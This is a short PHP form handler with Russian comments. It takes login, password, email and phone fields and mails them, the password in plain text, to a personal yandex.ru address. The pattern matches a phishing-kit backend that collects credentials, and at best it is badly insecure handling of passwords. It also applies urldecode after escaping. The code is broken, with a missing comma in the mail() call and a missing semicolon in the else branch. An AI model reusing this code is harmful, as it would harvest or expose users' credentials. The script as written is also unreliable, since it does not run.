<?php

// Получим данные с формы

$login = $_POST['login'];
$pass = $_POST['pass'];
$email = $_POST['email'];
$tel = $_POST['tel'];

// Обработаем полученные данные

$login = htmlspecialchars($login); // Преобразование символов в сущности
$pass = htmlspecialchars($pass);
$email = htmlspecialchars($email);
$tel = htmlspecialchars($tel);

$login = urldecode($login); // Декодирование URL
$pass = urldecode($pass);
$email = urldecode($email);
$tel = urldecode($tel);

$login = trim($login); // Удаление пробельных символов с обеих сторон
$pass = trim($pass);
$email = trim($email);
$tel = trim($tel);

// Отправляем данные на почту

if (mail("faykonleoshko@yandex.ru"
        "Новое письмо с сайта",
        "Логин: ".$login."\n".
        "Пароль: ".$pass."\n".
        "Email: ".$email."\n".
        "Телефон: ".$tel,
        "From: no-reply@mydomain.ru \r\n")
        
 ) {
    echo ('Письмо успешно отправлено!');
 }

else {
    echo ('Есть ошибки! Проверьте данные...')
}
?>